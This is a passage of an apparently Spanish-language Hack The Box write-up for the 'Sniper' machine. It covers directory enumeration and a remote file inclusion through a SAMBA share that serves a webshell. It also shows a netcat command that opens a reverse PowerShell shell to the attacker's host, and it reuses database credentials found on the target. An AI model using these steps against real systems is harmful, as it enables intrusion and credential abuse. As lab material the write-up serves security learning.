&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/blog/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x asp,aspx,php,html,txt -q
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/error.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/header.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;user&#34;&gt;/user/&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/user/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x asp,aspx,php,html,txt -q
/auth.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/db.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/DB.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/logout.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/registration.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/vendor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos dos rutas distintas donde estan almacenadas dos paginas diferentes, una donde se muestra un panel de inicio de sesion y la otra nos muestra una pagina con algunos articulos.&lt;/p&gt;
&lt;h3 id=&#34;user-1&#34;&gt;/user/&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200212.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;blog-1&#34;&gt;/blog/&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200252.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;lfi-rfi---shell-iusr&#34;&gt;LFI-RFI -&amp;gt; Shell IUSR&lt;/h2&gt;
&lt;p&gt;En la pagina de &lt;code&gt;/blog/&lt;/code&gt; encontramos que, al cambiar de idioma se le pasa como parametro un archivo existente a lang, a la pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200420.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar una consulta/archivo que no exista en la maquina nos muestra un mensaje de error, esto quiere decir que debe de existir el archivo en la maquina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200840.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos todos los payloads que pudiesen afectar a esta vulnerabilidad pero ninguno funciono, por lo que para explotar esta vulnerabilidad utilizamos un servidor SAMBA para pasarle como parametro una webshell desde nuestra maquina.&lt;/p&gt;
&lt;p&gt;Configuracion de Servidor SAMBA:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;apt-get install samba
mkdir /var/www/html/pub/ 
chmod &lt;span class=&#34;m&#34;&gt;0555&lt;/span&gt; /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/
touch &amp;gt; /etc/samba/smb.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;/etc/samba/smb.conf:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;global&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;workgroup&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; WORKGROUP
server &lt;span class=&#34;nv&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Samba Server %v
netbios &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; indishell-lab
&lt;span class=&#34;nv&#34;&gt;security&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; user
map to &lt;span class=&#34;nv&#34;&gt;guest&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; bad user
name resolve &lt;span class=&#34;nv&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; bcast host
dns &lt;span class=&#34;nv&#34;&gt;proxy&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; no
&lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt; interfaces &lt;span class=&#34;nv&#34;&gt;only&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;test&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /var/www/html/pub
&lt;span class=&#34;nv&#34;&gt;writable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
guest &lt;span class=&#34;nv&#34;&gt;ok&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
guest &lt;span class=&#34;nv&#34;&gt;only&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;only&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
directory &lt;span class=&#34;nv&#34;&gt;mode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0555&lt;/span&gt;
force &lt;span class=&#34;nv&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; nobody
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre&gt;&lt;code&gt;service smbd restart 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Acceder a:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;\\10.10.10.10\test\
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;La webshell que utilizamos es &lt;a href=&#34;https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php&#34;&gt;WhiteWinterWolf - Webshell&lt;/a&gt;. Una vez terminado nuestra configuracion le pasamos a la pagina nuestra IP junto con el SHARENAME y la webshell, y logramos ejecuar comandos con el usuario IUSR.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_201844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que podemos ejecutar comandos vamos a obtener una shell inversa utilizando netcat (nc.exe) en la misma carpeta donde colocamos nuestra webshell. Utilizamos el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.15.244&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;est&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;c.exe -e C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indowsPowerShell&lt;span class=&#34;se&#34;&gt;\v&lt;/span&gt;1.0&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;owershell.exe 10.10.15.244 &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_202318.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con el usuario IUSR.&lt;/p&gt;
&lt;h2 id=&#34;user---chris&#34;&gt;USER - Chris&lt;/h2&gt;
&lt;p&gt;Enumeramos los archivos que se encuentran en ambas paginas (blog, user) y encontramos en user un archivo de php en el que se encuentran las credenciales para la base de datos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_202509.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Host, User, Password, DB
&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;dbuser&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;36mEAhz/B8xQ~2VM&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;sniper&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de las carpetas de Usuarios (C:\Users) encontramos a Chris como uno de los usuarios, utilizamos la contraseña de la base de datos con el usuario Chris para verificar que tenga permisos de escritura en la maquina atraves de samba con smbmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User SMB session established on 10.10.10.151...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IP: 10.10.10.151:445	Name: 10.10.10.151                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	InitShutdown
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	lsass
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	ntsvcs
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	scerpc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-368-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	epmapper
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-1e4-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	LSM_API_service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	eventlog
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-408-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	atsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-598-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	wkssvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	spoolss
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-a2c-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	trkwks
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	W32TIME_ALT
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	srvsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	vgauth-service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-270-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-284-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	ROUTER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PIPE_EVENTROOT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;IMV2SCM EVENT PROVIDER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132236907993416575.1908.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	iisipmbed63cd4-5a7a-4011-8a3f-7ca5d2834ac3
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	iislogpipe3e6fd272-542c-4985-87e5-bd930a7401e4
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237251159401733.1252.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237268742138566.1496.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	IISFCGI-3e6bfe08-4ed8-4e32-97ff-7c49438ccb63
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	IISFCGI-0587ff21-c423-47bb-872e-34f067d827a9
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237302290243128.4168.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237304828945308.4400.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237305109360308.5580.DefaultAppDomain.wsmprovhost
	IPC$                                              	READ ONLY	Remote IPC
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
